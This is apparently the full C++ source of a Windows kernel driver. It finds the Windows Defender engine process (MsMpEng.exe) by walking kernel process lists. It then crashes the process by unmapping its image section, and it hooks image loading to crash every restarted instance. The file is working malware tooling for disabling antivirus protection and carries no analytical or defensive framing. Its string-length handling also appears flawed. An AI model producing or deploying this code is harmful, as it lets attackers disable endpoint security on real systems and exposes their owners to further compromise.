#include "stdafx.hpp"

#include "KernelStructures.hpp"


typedef unsigned int DWORD;
typedef PCHAR(*_PsGetProcessImageFileName)(PEPROCESS pProcess);
typedef PVOID(*_PsGetImageSectionBaseAddress)(PEPROCESS pProcess);
typedef NTSTATUS(*_MmUnmapViewOfSection)(PEPROCESS pProcess, PVOID pBaseAddress);
DWORD GetWinDefenderProcessId()
{
	UNICODE_STRING ustGetProcessImageFileName = RTL_CONSTANT_STRING(L"PsGetProcessImageFileName");
	_PsGetProcessImageFileName PsGetProcessImageFileName = reinterpret_cast<_PsGetProcessImageFileName>(MmGetSystemRoutineAddress(&ustGetProcessImageFileName));
	if (!PsGetProcessImageFileName)
	{
		return NULL;
	}

	PEPROCESS pStartProcess		= nullptr;
	PEPROCESS pCurrentProcess	= nullptr;
	if (NT_ERROR(PsLookupProcessByProcessId(ULongToHandle(4), &pCurrentProcess)))
	{
		return NULL;
	}
	pStartProcess = pCurrentProcess;

	DWORD dwWinDefenderProcessId = NULL;
	do
	{
		PCHAR szCurrentProcessName = PsGetProcessImageFileName(pCurrentProcess);
		if (!strcmp(szCurrentProcessName, "MsMpEng.exe"))
		{
			dwWinDefenderProcessId = static_cast<DWORD>((reinterpret_cast<_EPROCESS*>(pCurrentProcess)->UniqueProcessId));
			break;
		}

		pCurrentProcess = reinterpret_cast<PEPROCESS>(reinterpret_cast<UCHAR*>(reinterpret_cast<_EPROCESS*>(pCurrentProcess)->ActiveProcessLinks.Flink) - 0x448);
	} while (reinterpret_cast<_EPROCESS*>(pStartProcess)->UniqueProcessId != reinterpret_cast<_EPROCESS*>(pCurrentProcess)->UniqueProcessId);

	return dwWinDefenderProcessId;
}

bool CrashWinDefender(PEPROCESS pWinDefender)
{
	if (!pWinDefender)
	{
		return false;
	}

	UNICODE_STRING ustGetImageSectionBaseAddress = RTL_CONSTANT_STRING(L"PsGetProcessSectionBaseAddress");
	_PsGetImageSectionBaseAddress PsGetImageSectionBaseAddress = reinterpret_cast<_PsGetImageSectionBaseAddress>(MmGetSystemRoutineAddress(&ustGetImageSectionBaseAddress));
	if (!PsGetImageSectionBaseAddress)
	{
		return false;
	}

	UNICODE_STRING ustUnmapViewOfSection = RTL_CONSTANT_STRING(L"MmUnmapViewOfSection");
	_MmUnmapViewOfSection MmUnmapViewOfSection = reinterpret_cast<_MmUnmapViewOfSection>(MmGetSystemRoutineAddress(&ustUnmapViewOfSection));
	if (!MmUnmapViewOfSection)
	{
		return false;
	}

	if (NT_ERROR(MmUnmapViewOfSection(pWinDefender, PsGetImageSectionBaseAddress(pWinDefender))))
	{
		return false;
	}

	return true;
}

PWSTR GetEndingImageNamePortion(PUNICODE_STRING pFullImageName)
{
	int iStartElement = -1;
	for (int i = pFullImageName->Length - 1; i >= 0; i--)
	{
		if (pFullImageName->Buffer[i] == L'\\')
		{
			iStartElement = i + 1;
			break;
		}
	}

	if (iStartElement == -1)
	{
		return nullptr;
	}

	PWSTR wszEndingImageNamePortion = reinterpret_cast<PWSTR>(ExAllocatePool2(POOL_FLAG_NON_PAGED, (pFullImageName->Length - iStartElement)*sizeof(WCHAR), 'quer'));
	if (!wszEndingImageNamePortion)
	{
		return nullptr;
	}
	RtlZeroMemory(wszEndingImageNamePortion, (pFullImageName->Length - iStartElement) * sizeof(WCHAR));
	wcscpy_s(wszEndingImageNamePortion, pFullImageName->Length - iStartElement, pFullImageName->Buffer + iStartElement);

	return wszEndingImageNamePortion;
}
void CheckForWinDefender(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO ImageInfo)
{
	UNREFERENCED_PARAMETER(ProcessId);
	UNREFERENCED_PARAMETER(ImageInfo);

	PWSTR wszName = GetEndingImageNamePortion(FullImageName);
	if (!wszName)
	{
		return;
	}

	__try
	{
		if (wcscmp(wszName, L"MsMpEng.exe"))
		{
			return;
		}
		PEPROCESS pWinDefender = nullptr;
		if (NT_ERROR(PsLookupProcessByProcessId(ProcessId, &pWinDefender)))
		{
			return;
		}

		CrashWinDefender(pWinDefender);
		if (pWinDefender)
		{
			ObDereferenceObject(pWinDefender);
		}
	}
	__finally
	{
		if (wszName)
		{
			ExFreePoolWithTag(wszName, 'quer');
		}
	}
}

void DriverUnload(PDRIVER_OBJECT pDriver);
extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pRegistryPath)
{
	UNREFERENCED_PARAMETER(pRegistryPath);

	NTSTATUS DriverEntryStatus			= STATUS_SUCCESS;
	DWORD	dwWindowsDefenderProcessId	= NULL;
	do
	{
		dwWindowsDefenderProcessId = GetWinDefenderProcessId();
		if (!dwWindowsDefenderProcessId)
		{
			DriverEntryStatus = STATUS_INTERNAL_ERROR;
			break;
		}
		PEPROCESS pWinDefender = nullptr;
		DriverEntryStatus = PsLookupProcessByProcessId(ULongToHandle(dwWindowsDefenderProcessId), &pWinDefender);
		if (NT_ERROR(DriverEntryStatus))
		{
			break;
		}
		__try
		{
			if (!CrashWinDefender(pWinDefender))
			{
				break;
			}

			DriverEntryStatus = PsSetLoadImageNotifyRoutine(CheckForWinDefender);
			if (NT_ERROR(DriverEntryStatus))
			{
				break;
			}
		}
		__finally
		{
			if (pWinDefender)
			{
				ObDereferenceObject(pWinDefender);
			}
		}

		pDriver->DriverUnload = DriverUnload;
	} while (false);


	return DriverEntryStatus;
}
void DriverUnload(PDRIVER_OBJECT pDriver)
{
	UNREFERENCED_PARAMETER(pDriver);

	PsRemoveLoadImageNotifyRoutine(CheckForWinDefender);
}